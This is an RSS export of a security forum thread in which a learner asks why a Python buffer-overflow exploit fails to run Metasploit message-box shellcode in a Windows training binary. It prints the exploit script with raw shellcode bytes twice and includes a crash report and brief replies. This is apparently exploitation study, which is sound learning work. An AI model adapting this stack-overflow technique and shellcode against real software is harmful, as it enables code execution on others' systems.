@@ -1,0 +1,239 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Unable to execute hello world shellcode using buffer overflow in win32 using python</title>
+    <link>https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185</link>
+    <description>I have a binary, which, unfortunately can&#39;t share, downloaded from an online learning platform who has forbidden me to do so. It accepts the input from the stdin and I have triggered buffer overflow from there. Now I am curious how to run messsage box shellcode.
+
+```python
+import subprocess
+import sys
+
+if len(sys.argv) &lt; 2:
+     print(&quot;usage: %s TARGET_PATH&quot; % sys.argv[0])
+     sys.exit(1)
+
+# windows/messagebox - 272 bytes
+# https://metasploit.com/
+# VERBOSE=false, PrependMigrate=false, EXITFUNC=process, 
+# TITLE=MessageBox, TEXT=Hello, from MSF!, ICON=NO
+buf =  b&quot;&quot;
+buf += b&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31&quot;
+buf += b&quot;\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b&quot;
+buf += b&quot;\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3&quot;
+buf += b&quot;\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45&quot;
+buf += b&quot;\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&quot;
+buf += b&quot;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31&quot;
+buf += b&quot;\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d&quot;
+buf += b&quot;\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a&quot;
+buf += b&quot;\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb&quot;
+buf += b&quot;\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&quot;
+buf += b&quot;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec&quot;
+buf += b&quot;\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8&quot;
+buf += b&quot;\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89&quot;
+buf += b&quot;\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64&quot;
+buf += b&quot;\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&quot;
+buf += b&quot;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d&quot;
+buf += b&quot;\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f&quot;
+buf += b&quot;\x78\x58\x20\x68\x61\x67\x65\x42\x68\x4d\x65\x73&quot;
+buf += b&quot;\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3\x68\x58\x20&quot;
+buf += b&quot;\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20&quot;
+buf += b&quot;\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9&quot;
+buf += b&quot;\x88\x4c\x24\x10\x89\xe1\x31\xd2\x52\x53\x51\x52&quot;
+buf += b&quot;\xff\xd0\x31\xc0\x50\xff\x55\x08&quot;
+
+exploit = b&quot;The easiest way to overwrite s&quot;
+print(&quot;[!] Exploit length %s&quot; % len(exploit))
+
+exploit += buf
+print(&quot;[!] Exploit + payload length %s&quot; % len(exploit))
+
+print(&quot;[!] Launching &#39;%s&#39;&quot; % sys.argv[1])
+process = subprocess.Popen(sys.argv[1], stdin=subprocess.PIPE,
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+input_data = b&quot;Hello, subprocess!\n&quot; * 100
+
+print(&quot;[!] Writing to stdin&quot;)
+process.stdin.write(exploit)
+process.stdin.flush()
+process.stdin.close()
+
+print(&quot;[!] Communicate with process interactively&quot;)
+stdout, stderr = process.communicate()
+
+print(&quot;[#] Stdout: %s&quot; % stdout.decode())
+print(&quot;[#] Stderr: %s&quot; % stderr.decode())
+```
+Running this code even triggered the notification
+
+```
+Problem signature:
+  Problem Event Name:    APPCRASH
+  Application Name:    OverwriteStack.exe
+  Application Version:    0.0.0.0
+  Application Timestamp:    5388647a
+  Fault Module Name:    StackHash_0a9e
+  Fault Module Version:    0.0.0.0
+  Fault Module Timestamp:    00000000
+  Exception Code:    c0000005
+  Exception Offset:    d99bebd9
+  OS Version:    6.1.7600.2.0.0.256.1
+  Locale ID:    1033
+  Additional Information 1:    0a9e
+  Additional Information 2:    0a9e372d3b4ad19135b953a78882e789
+  Additional Information 3:    0a9e
+  Additional Information 4:    0a9e372d3b4ad19135b953a78882e789
+
+Read our privacy statement online:
+  http://go.microsoft.com/fwlink/?linkid=104288&amp;clcid=0x0409
+
+If the online privacy statement is not available, please read our privacy statement offline:
+  C:\Windows\system32\en-US\erofflps.txt
+```
+
+![image|690x492](upload://8V4Kum2K5Yw6BGsGCm9uqLEmBZI.png)
+
+There are no canaries, nothing exotic to prevent the buffer overload as I have other network based vulnerable binaries that work perfectly find with metasploit crafted payloads.</description>
+    
+    <lastBuildDate>Sat, 29 Jul 2023 10:31:57 +0000</lastBuildDate>
+    <category>Questions</category>
+    <atom:link href="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Unable to execute hello world shellcode using buffer overflow in win32 using python</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/4</link>
+        <pubDate>Mon, 27 Nov 2023 23:35:45 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-36185-4</guid>
+        <source url="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185.rss">Unable to execute hello world shellcode using buffer overflow in win32 using python</source>
+      </item>
+      <item>
+        <title>Unable to execute hello world shellcode using buffer overflow in win32 using python</title>
+        <dc:creator><![CDATA[tbhaxor]]></dc:creator>
+        <description><![CDATA[
+            <p>I want to write binary data to stdin. I am using ollydbg. I tried a lot by copying binary data and pasting onto stdin in the command prompt.</p>
+<p>I have done local and remote BOF by opening file, or sending bytes through network. But I dont know how to paste non-human-readable character in the cmd promp.</p>
+          <p><a href="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/3</link>
+        <pubDate>Sat, 29 Jul 2023 10:31:57 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-36185-3</guid>
+        <source url="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185.rss">Unable to execute hello world shellcode using buffer overflow in win32 using python</source>
+      </item>
+      <item>
+        <title>Unable to execute hello world shellcode using buffer overflow in win32 using python</title>
+        <dc:creator><![CDATA[c0z]]></dc:creator>
+        <description><![CDATA[
+            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/2/0298fb98e0881005f18298b01f09f56a0ea116f2.png" data-download-href="/uploads/short-url/mYIA9ezQJ0SnpHJVEtrLDOUVua.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/2/0298fb98e0881005f18298b01f09f56a0ea116f2_2_690x265.png" alt="image" data-base62-sha1="mYIA9ezQJ0SnpHJVEtrLDOUVua" width="690" height="265" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/2/0298fb98e0881005f18298b01f09f56a0ea116f2_2_690x265.png, https://0x00sec.s3.amazonaws.com/original/3X/0/2/0298fb98e0881005f18298b01f09f56a0ea116f2.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/2/0298fb98e0881005f18298b01f09f56a0ea116f2.png 2x" data-dominant-color="131416"></a></div><br>
+<img src="https://0x00sec.s3.amazonaws.com/original/3X/9/2/92115a9e229bf212a436690ed358f15c1297d50f.png" alt="image" data-base62-sha1="kQaTgz7P3B6hJIhLThl0I21gmCP" width="600" height="420"><p></p>
+<p>If you posted a picture of where the program crashed in a debugger we could help you more.</p>
+          <p><a href="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/2</link>
+        <pubDate>Sat, 29 Jul 2023 09:48:48 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-36185-2</guid>
+        <source url="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185.rss">Unable to execute hello world shellcode using buffer overflow in win32 using python</source>
+      </item>
+      <item>
+        <title>Unable to execute hello world shellcode using buffer overflow in win32 using python</title>
+        <dc:creator><![CDATA[tbhaxor]]></dc:creator>
+        <description><![CDATA[
+            <p>I have a binary, which, unfortunately can’t share, downloaded from an online learning platform who has forbidden me to do so. It accepts the input from the stdin and I have triggered buffer overflow from there. Now I am curious how to run messsage box shellcode.</p>
+<pre><code class="lang-python">import subprocess
+import sys
+
+if len(sys.argv) &lt; 2:
+     print("usage: %s TARGET_PATH" % sys.argv[0])
+     sys.exit(1)
+
+# windows/messagebox - 272 bytes
+# https://metasploit.com/
+# VERBOSE=false, PrependMigrate=false, EXITFUNC=process, 
+# TITLE=MessageBox, TEXT=Hello, from MSF!, ICON=NO
+buf =  b""
+buf += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31"
+buf += b"\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
+buf += b"\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3"
+buf += b"\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
+buf += b"\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
+buf += b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31"
+buf += b"\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
+buf += b"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a"
+buf += b"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb"
+buf += b"\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
+buf += b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
+buf += b"\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8"
+buf += b"\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
+buf += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
+buf += b"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
+buf += b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d"
+buf += b"\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f"
+buf += b"\x78\x58\x20\x68\x61\x67\x65\x42\x68\x4d\x65\x73"
+buf += b"\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3\x68\x58\x20"
+buf += b"\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
+buf += b"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9"
+buf += b"\x88\x4c\x24\x10\x89\xe1\x31\xd2\x52\x53\x51\x52"
+buf += b"\xff\xd0\x31\xc0\x50\xff\x55\x08"
+
+exploit = b"The easiest way to overwrite s"
+print("[!] Exploit length %s" % len(exploit))
+
+exploit += buf
+print("[!] Exploit + payload length %s" % len(exploit))
+
+print("[!] Launching '%s'" % sys.argv[1])
+process = subprocess.Popen(sys.argv[1], stdin=subprocess.PIPE,
+                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+input_data = b"Hello, subprocess!\n" * 100
+
+print("[!] Writing to stdin")
+process.stdin.write(exploit)
+process.stdin.flush()
+process.stdin.close()
+
+print("[!] Communicate with process interactively")
+stdout, stderr = process.communicate()
+
+print("[#] Stdout: %s" % stdout.decode())
+print("[#] Stderr: %s" % stderr.decode())
+</code></pre>
+<p>Running this code even triggered the notification</p>
+<pre><code class="lang-auto">Problem signature:
+  Problem Event Name:    APPCRASH
+  Application Name:    OverwriteStack.exe
+  Application Version:    0.0.0.0
+  Application Timestamp:    5388647a
+  Fault Module Name:    StackHash_0a9e
+  Fault Module Version:    0.0.0.0
+  Fault Module Timestamp:    00000000
+  Exception Code:    c0000005
+  Exception Offset:    d99bebd9
+  OS Version:    6.1.7600.2.0.0.256.1
+  Locale ID:    1033
+  Additional Information 1:    0a9e
+  Additional Information 2:    0a9e372d3b4ad19135b953a78882e789
+  Additional Information 3:    0a9e
+  Additional Information 4:    0a9e372d3b4ad19135b953a78882e789
+
+Read our privacy statement online:
+  http://go.microsoft.com/fwlink/?linkid=104288&amp;clcid=0x0409
+
+If the online privacy statement is not available, please read our privacy statement offline:
+  C:\Windows\system32\en-US\erofflps.txt
+</code></pre>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/e/3e85175b70abd0beca3ed371da7f6cd5df3640f6.png" data-download-href="/uploads/short-url/8V4Kum2K5Yw6BGsGCm9uqLEmBZI.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/e/3e85175b70abd0beca3ed371da7f6cd5df3640f6_2_690x492.png" alt="image" data-base62-sha1="8V4Kum2K5Yw6BGsGCm9uqLEmBZI" width="690" height="492" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/e/3e85175b70abd0beca3ed371da7f6cd5df3640f6_2_690x492.png, https://0x00sec.s3.amazonaws.com/optimized/3X/3/e/3e85175b70abd0beca3ed371da7f6cd5df3640f6_2_1035x738.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/e/3e85175b70abd0beca3ed371da7f6cd5df3640f6.png 2x" data-dominant-color="96AFC0"></a></div><p></p>
+<p>There are no canaries, nothing exotic to prevent the buffer overload as I have other network based vulnerable binaries that work perfectly find with metasploit crafted payloads.</p>
+          <p><a href="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185/1</link>
+        <pubDate>Sat, 29 Jul 2023 07:34:43 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-36185-1</guid>
+        <source url="https://0x00sec.org/t/unable-to-execute-hello-world-shellcode-using-buffer-overflow-in-win32-using-python/36185.rss">Unable to execute hello world shellcode using buffer overflow in win32 using python</source>
+      </item>
+  </channel>
+</rss>
